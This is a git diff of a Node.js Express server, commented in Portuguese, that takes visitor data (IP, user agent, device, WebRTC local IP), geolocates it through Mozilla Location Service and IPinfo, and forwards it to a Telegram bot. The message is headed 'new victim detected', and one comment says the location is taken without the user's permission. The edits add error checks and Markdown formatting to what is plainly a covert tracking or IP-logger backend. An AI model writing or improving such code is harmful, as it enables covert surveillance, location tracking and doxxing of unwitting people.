@@ -4,7 +4,7 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Variáveis do ambiente (.env ou Render)
+// Variáveis do ambiente (.env ou Render dashboard)
 const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
 
@@ -27,32 +27,36 @@ app.post('/log', async (req, res) => {
   let preciseLoc = null;
 
   try {
+    // Localização aproximada com base no IP (sem permissão do usuário)
     const mlsRes = await fetch("https://location.services.mozilla.com/v1/geolocate?key=test", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ considerIp: true })
     });
     const mlsData = await mlsRes.json();
-    preciseLoc = `${mlsData.location.lat},${mlsData.location.lng}`;
+    if (mlsData && mlsData.location) {
+      preciseLoc = `${mlsData.location.lat},${mlsData.location.lng}`;
+    }
   } catch (mlsErr) {
     console.warn("⚠️ Mozilla Location Service falhou:", mlsErr);
   }
 
   try {
+    // Consulta de IP pública (IPinfo)
     const ipResponse = await fetch(`https://ipinfo.io/${data.ip}?token=c5633786f81824`);
     const ipInfo = await ipResponse.json();
 
     const mensagem = `
-📡 NOVA VÍTIMA DETECTADA
+📡 *NOVA VÍTIMA DETECTADA*
 
-🧠 ID: ${data.visitorId}
-🌍 IP: ${data.ip}
-📍 Localização: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
-🏢 ISP: ${ipInfo.org}
-🕵️‍♂️ Agente: ${data.userAgent}
-📱 Dispositivo: ${data.device}
-📌 Lat/Long: ${preciseLoc || data.loc || ipInfo.loc}
-🌐 IP Local (WebRTC): ${data.localIP || "N/A"}
+🧠 *ID:* \`${data.visitorId}\`
+🌍 *IP:* \`${data.ip}\`
+📍 *Localização:* ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
+🏢 *ISP:* ${ipInfo.org}
+🕵️‍♂️ *User-Agent:* \`${data.userAgent}\`
+📱 *Dispositivo:* \`${data.device}\`
+📌 *Lat/Long:* ${preciseLoc || ipInfo.loc || "Indisponível"}
+🌐 *IP Local (WebRTC):* \`${data.localIP || "N/A"}\`
 `;
 
     const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -60,7 +64,8 @@ app.post('/log', async (req, res) => {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: chatId,
-        text: mensagem
+        text: mensagem,
+        parse_mode: "Markdown"
       })
     });
 
